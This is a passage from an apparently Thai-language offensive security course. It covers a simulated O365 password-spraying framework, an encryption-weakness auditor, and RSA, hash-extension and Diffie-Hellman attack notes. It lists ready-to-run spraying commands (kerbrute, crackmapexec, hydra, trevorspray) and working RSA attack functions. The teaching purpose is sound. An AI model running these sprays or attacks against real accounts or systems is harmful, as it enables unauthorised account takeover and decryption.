        # In real attack: POST to login.microsoftonline.com
        # Rate limiting: 1 password per user per 30 min to avoid lockout
        
        results = []
        print(f"[*] Spraying {len(usernames)} accounts with: {password}")
        print("[*] Note: In real test, wait 30 minutes between attempts!")
        
        for username in usernames:
            # Simulate authentication check
            status = self._simulate_auth(username, password)
            
            result = SprayResult(
                username=username,
                password=password,
                status=status,
                response_time=0.5,
                timestamp=datetime.now().isoformat()
            )
            results.append(result)
            
            if status == 'success':
                print(f"[+] VALID: {username}:{password}")
            elif status == 'locked':
                print(f"[!] LOCKED: {username} - lockout detected!")
        
        return results
    
    def _simulate_auth(self, username: str, password: str) -> str:
        """Simulate authentication (replace with actual auth in real pentest)"""
        # Simulated: test@company.com with 'Summer2024!' succeeds
        if username == "test@company.com" and password == "Summer2024!":
            return "success"
        elif username.endswith("@company.com"):
            return "failed"  
        return "failed"
    
    def o365_enumeration_commands(self) -> Dict[str, str]:
        """O365 เครื่องมือและคำสั่ง"""
        return {
            "trevorspray_spray": (
                "python3 trevorspray.py -u users.txt -p 'Summer2024!' "
                "--url https://login.microsoftonline.com -j 5 --delay 1800"
            ),
            "sprayhound": (
                "sprayhound -u users.txt --password-file passwords.txt "
                "--domain company.com --dc dc01.company.com"
            ),
            "kerbrute_spray": (
                "kerbrute passwordspray --dc dc01.company.com "
                "-d company.com users.txt 'Summer2024!'"
            ),
            "o365creeper_enum": (
                "python3 o365creeper.py -f emails.txt "
                "-o valid_users.txt"
            ),
            "crackmapexec_spray": (
                "crackmapexec smb dc01.company.com -u users.txt "
                "-p 'Summer2024!' --continue-on-success"
            ),
            "ldap_spray": (
                "hydra -L users.txt -p 'Summer2024!' "
                "ldap://dc01.company.com -t 1 -W 1800"
            )
        }
    
    def analyze_results(self, results: List[SprayResult]) -> Dict:
        """Analyze spray results"""
        successes = [r for r in results if r.status == 'success']
        locked = [r for r in results if r.status == 'locked']
        mfa_required = [r for r in results if r.status == 'mfa_required']
        
        return {
            "total_attempts": len(results),
            "successful": len(successes),
            "locked_accounts": len(locked),
            "mfa_accounts": len(mfa_required),
            "success_rate": f"{(len(successes)/len(results)*100):.1f}%" if results else "0%",
            "valid_credentials": [
                {"user": r.username, "pass": r.password}
                for r in successes
            ],
            "recommendations": [
                "Reset sprayed passwords immediately",
                "Enable account lockout after 5 attempts",
                "Deploy MFA for all accounts",
                "Monitor for unusual login patterns"
            ]
        }


if __name__ == '__main__':
    framework = PasswordSprayingFramework()
    
    # Generate passwords for spray
    passwords = framework.generate_spray_passwords("company", 2024)
    print("Password Spray List:")
    for p in passwords[:10]:
        print(f"  {p}")
    
    # Sample usernames
    usernames = [
        "john.doe@company.com",
        "jane.smith@company.com",
        "test@company.com",
        "admin@company.com"
    ]
    
    # Spray with first password
    results = framework.perform_o365_spray(usernames, passwords[0])
    
    analysis = framework.analyze_results(results)
    print("\nSpray Results:")
    print(json.dumps(analysis, indent=2))
    
    print("\nSpray Tools:")
    for tool, cmd in framework.o365_enumeration_commands().items():
        print(f"  {tool}: {cmd[:70]}...")
```

---

## Step 656: Encryption Weakness Analysis

```python
#!/usr/bin/env python3
# Encryption Weakness Analysis - วิเคราะห์จุดอ่อนในการเข้ารหัส

from dataclasses import dataclass, field
from typing import List, Dict, Optional
import os
import struct

@dataclass
class EncryptionIssue:
    severity: str
    category: str
    description: str
    impact: str
    recommendation: str

class EncryptionAuditor:
    def audit_code_snippet(self, code: str, language: str = "python") -> List[EncryptionIssue]:
        """ตรวจสอบ Code หาการใช้งาน Crypto ที่ผิดพลาด"""
        issues = []
        code_lower = code.lower()
        
        # ECB mode
        if 'mode_ecb' in code_lower or 'aes.mode_ecb' in code_lower or "mode='ecb'" in code_lower:
            issues.append(EncryptionIssue(
                severity="CRITICAL",
                category="Insecure Cipher Mode",
                description="AES-ECB mode used - identical plaintext blocks produce identical ciphertext",
                impact="Pattern leakage, known-plaintext attacks, block reordering",
                recommendation="Use AES-GCM or AES-CBC with proper IV"
            ))
        
        # Hardcoded key
        patterns = ['key = b"', 'key = "', "secret_key = '", 'ENCRYPT_KEY =']
        for pattern in patterns:
            if pattern in code:
                issues.append(EncryptionIssue(
                    severity="CRITICAL",
                    category="Hardcoded Encryption Key",
                    description=f"Hardcoded encryption key detected near: '{pattern}'",
                    impact="Key exposure if source code is leaked",
                    recommendation="Store keys in secure vaults (HashiCorp Vault, AWS KMS, Azure Key Vault)"
                ))
                break
        
        # Static IV
        if 'iv = b"\x00' in code or "iv = bytes([0" in code or "iv = b'\\x00" in code:
            issues.append(EncryptionIssue(
                severity="HIGH",
                category="Static Initialization Vector",
                description="Constant/null IV used for CBC encryption",
                impact="Predictable ciphertext, authentication bypass",
                recommendation="Generate random IV with os.urandom(16) for each encryption"
            ))
        
        # MD5 for passwords
        if 'hashlib.md5' in code_lower and ('password' in code_lower or 'passwd' in code_lower):
            issues.append(EncryptionIssue(
                severity="HIGH",
                category="Weak Password Hashing",
                description="MD5 used for password hashing",
                impact="Fast GPU cracking, rainbow table attacks",
                recommendation="Use bcrypt, scrypt, or Argon2 for password hashing"
            ))
        
        # No MAC/authentication
        if 'encrypt' in code_lower and 'hmac' not in code_lower and 'gcm' not in code_lower and 'mac' not in code_lower:
            if 'CBC' in code or 'cbc' in code:
                issues.append(EncryptionIssue(
                    severity="HIGH",
                    category="Encryption Without Authentication",
                    description="CBC mode without MAC - vulnerable to padding oracle",
                    impact="Padding oracle decryption, bit-flipping attacks",
                    recommendation="Use Authenticated Encryption (AES-GCM) or add HMAC-then-Encrypt"
                ))
        
        # Weak random
        if 'random.random()' in code or 'random.randint' in code:
            if 'key' in code_lower or 'token' in code_lower or 'secret' in code_lower:
                issues.append(EncryptionIssue(
                    severity="HIGH",
                    category="Weak Random Number Generator",
                    description="Python random module used for security-sensitive values",
                    impact="Predictable keys/tokens, session fixation",
                    recommendation="Use os.urandom() or secrets module for cryptographic randomness"
                ))
        
        return issues
    
    def demonstrate_ecb_weakness(self) -> Dict:
        """Show why ECB mode is dangerous"""
        try:
            from Crypto.Cipher import AES
            from Crypto.Util.Padding import pad
            
            key = os.urandom(16)
            
            # ECB: same plaintext blocks -> same ciphertext
            message1 = b"ATTACK AT DAWN!!ATTACK AT DAWN!!"
            message2 = b"DEFEND AT DUSK!!ATTACK AT DAWN!!"
            
            cipher_ecb = AES.new(key, AES.MODE_ECB)
            ct1 = cipher_ecb.encrypt(message1)
            
            cipher_ecb = AES.new(key, AES.MODE_ECB)
            ct2 = cipher_ecb.encrypt(message2)
            
            # Blocks 1 (ATTACK AT DAWN!!) should be identical in both
            return {
                "mode": "ECB",
                "message1": message1.hex(),
                "message2": message2.hex(),
                "ciphertext1": ct1.hex(),
                "ciphertext2": ct2.hex(),
                "block1_match": ct1[16:32] == ct2[16:32],
                "explanation": "Blocks 2 are identical in both messages, and their ciphertexts match!"
            }
        except ImportError:
            return {
                "mode": "ECB",
                "explanation": (
                    "ECB encrypts each 16-byte block independently.\n"
                    "Same plaintext block ALWAYS produces same ciphertext block.\n"
                    "This reveals patterns in encrypted data.\n"
                    "Classic example: encrypted PNG image still shows the penguin!"
                )
            }
    
    def get_secure_crypto_examples(self) -> Dict[str, str]:
        """Show correct cryptography implementation"""
        return {
            "aes_gcm_encrypt": '''
import os
from Crypto.Cipher import AES

def encrypt_secure(plaintext: bytes, key: bytes) -> bytes:
    """AES-256-GCM: Authenticated encryption with associated data"""
    nonce = os.urandom(16)  # Random nonce per encryption
    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
    ciphertext, tag = cipher.encrypt_and_digest(plaintext)
    # Return: nonce + tag + ciphertext
    return nonce + tag + ciphertext

def decrypt_secure(data: bytes, key: bytes) -> bytes:
    """Decrypt and verify authentication"""
    nonce = data[:16]
    tag = data[16:32]
    ciphertext = data[32:]
    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
    plaintext = cipher.decrypt_and_verify(ciphertext, tag)  # Raises if tampered
    return plaintext
            ''',
            "password_hashing": '''
import bcrypt

def hash_password(password: str) -> str:
    """bcrypt with automatic salt generation"""
    salt = bcrypt.gensalt(rounds=12)  # Cost factor 12
    return bcrypt.hashpw(password.encode(), salt).decode()

def verify_password(password: str, hashed: str) -> bool:
    return bcrypt.checkpw(password.encode(), hashed.encode())

# OR with Argon2:
# from argon2 import PasswordHasher
# ph = PasswordHasher()
# hash = ph.hash(password)
# ph.verify(hash, password)
            ''',
            "secure_random": '''
import os
import secrets

# For keys and IVs:
key = os.urandom(32)     # 256-bit AES key
nonce = os.urandom(16)   # 128-bit nonce

# For tokens:
token = secrets.token_hex(32)      # 256-bit hex token
url_token = secrets.token_urlsafe(32)  # URL-safe token
            '''
        }


if __name__ == '__main__':
    auditor = EncryptionAuditor()
    
    # Sample vulnerable code
    vulnerable_code = '''
import hashlib
from Crypto.Cipher import AES

key = b"mysecretkey12345"  # Hardcoded!
iv = b"\x00" * 16  # Static IV!

def encrypt_password(password):
    # MD5 for passwords!
    return hashlib.md5(password.encode()).hexdigest()

def encrypt_data(data):
    # ECB mode!
    cipher = AES.new(key, AES.MODE_ECB)
    return cipher.encrypt(data)
    '''
    
    print("Code Security Audit:")
    issues = auditor.audit_code_snippet(vulnerable_code)
    for issue in issues:
        print(f"\n[{issue.severity}] {issue.category}")
        print(f"  Description: {issue.description}")
        print(f"  Impact: {issue.impact}")
        print(f"  Fix: {issue.recommendation}")
    
    print("\nECB Weakness Demo:")
    ecb_demo = auditor.demonstrate_ecb_weakness()
    print(ecb_demo.get('explanation', str(ecb_demo)))
```

---

## Steps 657-660: Advanced Crypto Attacks Summary

```bash
#!/bin/bash
# สรุปเครื่องมือและเทคนิค Cryptography Attacks

# Step 657: Hash Length Extension Attack
echo "=== Hash Length Extension ==="
cat << 'PYTHON'
import hashlib
import struct

def sha256_pad(message_len):
    """SHA-256 padding calculation"""
    ml = message_len * 8  # Length in bits
    pad = b'\x80'
    # Pad to 448 bits mod 512
    pad += b'\x00' * ((55 - message_len) % 64)
    pad += struct.pack('>Q', ml)  # Big-endian 64-bit length
    return pad

# Hash Length Extension:
# If sig = MD5(secret || message), attacker can compute:
# sig' = MD5(secret || message || padding || extension)
# without knowing the secret!

# Tools:
# hashpump: hashpump -s <signature> -d <data> -a <addition> -k <key_len>
# hash-extender: hash_extender --data="user" --secret-len=16 --append="admin=1" --signature="<hash>" --format=sha256
PYTHON

# Step 658: RSA Attacks
echo "=== RSA Attacks ==="
cat << 'PYTHON'
# Weak RSA attacks

# 1. Small Public Exponent (e=3) attack
# If m^3 < n, then cube_root(c) = m
import gmpy2

def small_exponent_attack(c: int, e: int = 3) -> int:
    m, exact = gmpy2.iroot(c, e)
    if exact:
        return int(m)
    return None

# 2. Common Modulus Attack 
# If same message encrypted with same n but different e:
# (e1,e2 coprime) -> extended Euclidean -> recover m
def common_modulus_attack(c1, c2, e1, e2, n):
    import math
    if math.gcd(e1, e2) != 1:
        return None
    # Extended Euclidean: s1*e1 + s2*e2 = 1
    gcd, s1, s2 = gmpy2.gcdext(e1, e2)
    if s1 < 0:
        c1 = gmpy2.invert(c1, n)
        s1 = -s1
    if s2 < 0:
        c2 = gmpy2.invert(c2, n)
        s2 = -s2
    return pow(c1, s1, n) * pow(c2, s2, n) % n

# 3. Wiener's Attack (small private exponent)
# If d < n^0.25, RSA is insecure
# pip install owiener
# import owiener; d = owiener.attack(e, n)

print("RSA Attacks: small e, common modulus, Wiener's attack")
PYTHON

# Step 659: Diffie-Hellman Attacks  
echo "=== Diffie-Hellman Attacks ==="
cat << 'PYTHON'
# Weak Diffie-Hellman Parameters

# 1. Small Subgroup Attack
# If p-1 has small factors, attacker can work in small subgroup

# 2. LogJam - Precomputed DH (512-bit export grade)
# Many servers support DHE-EXPORT with 512-bit DH groups
# Precomputed logs break it in ~7 minutes

# 3. Invalid Curve Attack (ECDH)
# Send point not on the actual curve
# Forces calculations in a group with small order
# Recover private key bit by bit using CRT

# Safe DH parameters:
import ssl
# Use: DH >= 2048 bits, use named curves (P-256, P-384)
# Generate: openssl dhparam -out dhparam.pem 2048

print("DH Attacks: small subgroup, LogJam, invalid curve")
PYTHON

# Step 660: Crypto CTF Tools
echo "=== Crypto CTF Toolkit ==="
cat << 'PYTHON'
# Common crypto CTF attack toolkit

# Tools:
# 1. SageMath - mathematical software (sage -python script.py)
# 2. CrypTool - GUI crypto tool
# 3. RsaCtfTool: python3 RsaCtfTool.py -e 65537 -n <modulus> --uncipher <cipher>
# 4. factordb: factor large N at factordb.com
# 5. dcode.fr: many classical ciphers
# 6. CyberChef: online crypto toolkit

# RsaCtfTool usage:
rsactftool_examples = """
# Factor N and decrypt:
python3 RsaCtfTool.py -e 65537 -n 12345678... --uncipher 98765432...

# Private key from p,q:
python3 RsaCtfTool.py -p 12345... -q 98765... --private

# Wiener attack:
python3 RsaCtfTool.py --publickey pub.pem --attack wiener

# All attacks:
python3 RsaCtfTool.py --publickey pub.pem --attack all
"""

print("RsaCtfTool examples:", rsactftool_examples)
PYTHON

echo "Cryptography Attack Tools Summary:"
echo "  hashcat: GPU hash cracking"
echo "  john: CPU hash cracking"
echo "  jwt_tool: JWT attack framework"
echo "  padbuster: Automated padding oracle"
echo "  testssl.sh: TLS configuration testing"
echo "  RsaCtfTool: RSA CTF attack tool"
echo "  msieve: Integer factorization"
echo "  yafu: Fast factorization"
```

---

## สรุป Part 66

ในส่วนนี้เราได้เรียนรู้:
- **Hash Cracking**: Dictionary, Brute Force, Rainbow Tables, Rule-based attacks
- **JWT Attacks**: None algorithm, weak secret brute force, RS256→HS256 confusion, kid injection
- **Padding Oracle**: CBC decryption โดยไม่รู้ Key ผ่าน oracle
- **TLS Attacks**: BEAST, POODLE, Heartbleed detection, weak cipher analysis
- **Password Spraying**: O365 spraying, Kerbrute, CrackMapExec
- **Encryption Weaknesses**: ECB mode, static IV, MD5 passwords, missing authentication
- **Hash Extension**: SHA-256 padding manipulation
- **RSA Attacks**: Small exponent, common modulus, Wiener's attack
- **DH Attacks**: LogJam, invalid curve, small subgroup
- **CTF Toolkit**: RsaCtfTool, SageMath, CyberChef
